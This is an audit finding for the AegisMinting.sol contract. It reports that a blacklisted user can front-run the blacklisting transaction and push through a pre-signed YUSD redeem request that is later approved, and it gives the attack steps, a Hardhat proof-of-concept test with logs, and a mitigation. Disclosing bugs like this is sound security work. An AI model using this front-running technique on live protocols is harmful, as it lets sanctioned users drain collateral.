# Black listed user can redeem YUSD tokens

## Summary:

The `approveRedeemRequest` function in `AegisMinting.sol` has a vulnerability where blacklisted users can still redeem YUSD tokens. The issue arises from the fact that the black listed user can front run the black listing transaction and execute already signed `redeemOrder`, allowing blacklisted users to create redeem requests and bypass the intended restrictions.

## Vulnerability Details:

The vulnerability occurs in the [`approveRedeemRequest()`](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L315) function where:

- An black listed user can front run the black listing transaction and execute the already signed `requestRedeem` function. 
- The `approveRedeemRequest` function does not check if the user is black listed or not, thus once the `FUND_MANAGER` approves the redeem request, the already locked YUSD will be burned and the black listed user will be able to redeem the YUSD tokens and get the equivalent amount of collateral tokens.
- Thus the black listed user can redeem the YUSD tokens and get the equivalent amount of collateral tokens, which is not intended by the protocol.

## Impact:

- Blacklisted users can redeem YUSD tokens and get the equivalent amount of collateral tokens
- Degradation of protocol functionality and user trust

## Proof of Concept:

1. Alice prepares a redeem request with request ID "alice-123" and signs it
2. Now, the YUSD owner black lists Alice
3. Alice observes the black listing transaction in the mempool and quickly sends her redeem request transaction with the signed order
4. The redeem request transaction is executed then the black listing transaction gets confirmed
5. Now Alice is black listed but she has already requested redemption.
6. Later, the fund manager approves the redeem request and the YUSD is burned and the equivalent amount of collateral tokens are sent to Alice
7. The black listed user has successfully redeemed the YUSD tokens and got the equivalent amount of collateral tokens, which is not intended by the protocol.

### Proof Of Code:

1. Add the following code to `6_aegis_minting_redeem_spec.ts` in `test` directory:
2. Run the test using the command `npx hardhat test`

```ts
it.only("Blacklisted user can redeem collateral", async () => {
  const [owner, sender, alice] = await ethers.getSigners();

  const {
    aegisMintingContract,
    aegisMintingAddress,
    assetAddress,
    assetContract,
    yusdContract,
    aegisConfig,
  } = await loadFixture(deployFixture);

  await aegisConfig["whitelistAddress(address,bool)"](alice, true);

  await yusdContract.setMinter(owner);
  await yusdContract.mint(alice, ethers.parseEther("100"));
  await yusdContract.setMinter(aegisMintingAddress);
  // Approve YUSD to be sent by AegisMinting contract from alice
  await yusdContract
    .connect(alice)
    .approve(aegisMintingAddress, ethers.parseEther("1000"));
  await assetContract.mint(aegisMintingAddress, ethers.parseEther("1000"));

  const requestId = "alice-123";
  const collateralAmount = ethers.parseEther("100");
  const yusdAmount = ethers.parseEther("100");
  const redeemOrder = {
    orderType: OrderType.REDEEM,
    userWallet: alice.address,
    collateralAsset: assetAddress,
    collateralAmount: collateralAmount,
    yusdAmount: yusdAmount,
    slippageAdjustedAmount: yusdAmount,
    expiry: (await time.latest()) + 10000,
    nonce: Date.now(),
    additionalData: encodeString(requestId),
  };
  // Alice signs the order
  const signature = await signOrder(redeemOrder, aegisMintingAddress);

  const aliceBalance_before = await assetContract.balanceOf(alice.address);
  const contractBalance = await assetContract.balanceOf(aegisMintingAddress);
  console.log(
    "Alice collateral balance before redemption:",
    aliceBalance_before
  );

  console.log("\nOwner black lists the alice");
  console.log(
    "Alice front runs the tx and executes the redeem request that is already signed"
  );
  console.log("--- Alice tx goes through first ---");
  // Alice requests redemption
  await expect(
    aegisMintingContract.connect(alice).requestRedeem(redeemOrder, signature)
  ).to.be.not.reverted;

  // Alice redeem request status
  const redeemRequest = await aegisMintingContract.getRedeemRequest(requestId);
  console.log("Alice's redeem request time stamp:", redeemRequest.timestamp);
  console.log("\n--- Now black listing tx goes through ---");

  // Alice gets blacklisted
  await yusdContract.addBlackList(alice.address);

  console.log(
    "Alice black list status:",
    await yusdContract.isBlackListed(alice.address)
  );

  console.log("\nNow fund manager approves his redeem request");

  await aegisMintingContract.grantRole(FUNDS_MANAGER_ROLE, owner);

  // Already pending redeem request of alice is approved
  await aegisMintingContract
    .connect(owner)
    .approveRedeemRequest(requestId, collateralAmount);

  const aliceBalance_after = await assetContract.balanceOf(alice.address);

  console.log("Alice collateral balance after redemption:", aliceBalance_after);
});
```

**Logs**

```ts
Alice collateral balance before redemption: 0n

Owner black lists the alice
Alice front runs the tx and executes the redeem request that is already signed
--- Alice tx goes through first ---
Alices redeem request time stamp: 1746006770n

--- Now black listing tx goes through ---
Alice black list status: true

Now fund manager approves his redeem request
Alice collateral balance after redemption: 100000000000000000000n
        âœ” Blacklisted user can redeem collateral (1416ms)
```

## Recommended Mitigation:

Add a check in the `approveRedeemRequest` function to ensure that the user is not blacklisted before approving the redeem request.
